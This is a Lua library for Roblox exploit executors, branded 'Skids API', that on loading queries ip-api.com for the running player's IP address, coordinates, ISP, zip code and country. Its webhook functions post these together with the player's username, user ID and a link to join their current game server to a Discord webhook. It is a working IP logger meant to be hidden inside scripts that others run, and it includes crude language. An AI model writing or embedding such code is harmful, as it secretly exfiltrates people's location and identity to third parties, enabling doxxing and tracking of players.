do
    -- This function returns a string with the name of the exploit u using(only checks for krnl, synapse, script ware)
    local function checkExploit()
        
        local exploitName = (syn and 'Synapse') or (Krnl and 'Krnl') or ( identifyexecutor and identifyexecutor() ) or (getexecutorname and getexecutorname())

        exploitName = exploitName or 'I don\'t fucking know'

        return exploitName

    end

    local skidApi = {
        webhookJson = function(self, scriptName)

            if not self then return end

            local player = game.Players.LocalPlayer
            local playerThumb = string.format('https://www.roblox.com/Thumbs/Avatar.ashx?x=420&y=420&userid=%d&format=png', player.UserId)
            local ipData = self.ipApi
       
       
            scriptName = scriptName or 'Viva Mexico'
       
       
            return {
                ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName,
                ["embeds"] = {
                        {
                        ["title"] = "Skids API",
                        ["description"] = "__a library made for skids :wink:__",
                        ["url"] = "https://discord.gg/EUaH265S",
                        ["color"] = 526344,
                        ["fields"] = {
                            {
                            ["name"] = "User Data",
                            ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername:%s\nDisplayName:%s\nUserID:%d', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'), player.UserId)
                            },
                            {
                            ["name"] = "More Info",
                            ["value"] = string.format("*IPV4/V6: ||%s||*\n*Lat/Lon: %s/%s*\n*Isp/Org*: %s\n*Exploit: %s*\n*Country/Region:%s/%s*\n*zip: %s*", self.ipApi['query'], self.ipApi['lat'], self.ipApi['lon'], self.ipApi['isp'], self.exploitName ,self.ipApi['country'],self.ipApi['regionName'], self.ipApi['zip'])
                            }
                        },
                        ["author"] = {
                            ["name"] = "Skids Hub/ramirez",
                            ["url"] = "https://discord.gg/EUaH265S",
                            ["icon_url"] = "https://sweetiefoxislife.000webhostapp.com/media/slutshub.png"
                        },
                        ["footer"] = {
                            ["text"] = "Skids Hub/ramirez",
                            ["icon_url"] = "https://sweetiefoxislife.000webhostapp.com/media/slutshub.png"
                        },
                        ["timestamp"] = os.date('%Y-%m-%dT%H:%M:%S.%M%SZ')
                        }
                }
            }
        end,

        ipApi = game:GetService('HttpService'):JSONDecode(game:HttpGet('http://ip-api.com/json')),
        exploitName = checkExploit(),

        httpPost = (Krnl and request) or (syn and syn.request) or http_request or (http and http.request),
        
        sendWebhook = function(self,webhooklink, ...)
            print('rekt')
            if self and webhooklink and self.httpPost and self.webhookJson then

                if type(self.webhookJson) == "function" then
                    return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self:webhookJson(...)) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
                end
                return self.httpPost(
                    {
                        Url = webhooklink,
                        Method = 'POST',
                        Body = game:GetService('HttpService'):JSONEncode(self.webhookJson) ,
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        }
                    }
                )
            end
        end,
        sendWebhookGame = function(self,webhooklink, scriptName)

            if not self then return end

            scriptName = scriptName or 'Viva Mexico!'
            local player = game.Players.LocalPlayer
            local gameThumb = string.format('https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png',game.PlaceId)

            local webhookJson = {

            ["content"] = '@'..player.Name .. '(' .. ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A').. ') fired ' .. scriptName ,
            ["embeds"] = {
                {
                ["title"] = "Skids API",
                ["description"] = "__a library made for skids :wink:__",
                ["url"] = "https://discord.gg/EUaH265S",
                ["color"] = 526344,
                ["fields"] = {
                    {
                    ["name"] = "User Data",
                    ["value"] = string.format('Profile: https://roblox.com/users/%d/profile\nUsername: %s\nDisplayName: %s\nUserID: %d\nLink: ||Roblox.GameLauncher.joinGameInstance(%d, "%s")||', player.UserId, player.Name, ((not (player.DisplayName == player.Name) and player.DisplayName ) or 'N/A'),  player.UserId, game.PlaceId ,game.JobId)
                    }
                },
                ["author"] = {
                    ["name"] = "Skids Hub/ramirez",
                    ["url"] = "https://discord.gg/EUaH265S",
                    ["icon_url"] = "https://sweetiefoxislife.000webhostapp.com/media/slutshub.png"
                },
                ["footer"] = {
                    ["text"] = "Skids Hub/ramirez",
                    ["icon_url"] = "https://sweetiefoxislife.000webhostapp.com/media/slutshub.png"
                },
                ["thumbnail"] = {
                    ["url"] = gameThumb
                  },
                  ["timestamp"] = os.date('%Y-%m-%dT%H:%M:%S.%M%SZ')
                }
            }
            }

            self.httpPost(
                {
                    Url = webhooklink,
                    Method ='POST',
                    Body = game:GetService('HttpService'):JSONEncode(webhookJson),
                    Headers = {
                        ['Content-Type'] = 'application/json'
                    }
                }
            )
        end

    }

    -- skidApi:sendWebhook('', 'Test1')
    -- skidApi:sendWebhookGame('', 'test 1')

    return skidApi
end








